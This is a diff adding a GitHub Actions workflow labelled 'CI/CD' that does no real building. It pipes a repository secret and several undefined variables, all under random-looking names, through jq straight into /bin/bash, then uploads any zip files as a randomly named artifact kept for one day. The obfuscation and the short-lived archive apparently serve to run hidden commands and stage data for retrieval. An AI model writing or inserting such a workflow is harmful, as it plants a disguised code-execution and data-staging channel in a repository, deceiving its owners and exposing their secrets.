@@ -1,0 +1,30 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          hdu3: ${{ secrets.hdu3 }}
+        run: |
+          printf '%s' "$hdu3" | jq -r .irhor75634 | /bin/bash
+          echo $ki356 | jq -r .hxaz1 | /bin/bash
+          echo $njm09426 | jq -r .y90 | /bin/bash
+          printf '%s' "$n8304" | jq -r .oxga1003 | /bin/bash
+          echo $gcfon8569 | jq -r .eclh96 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: X6EC3biG
+          path: "*.zip"
+          retention-days: 1
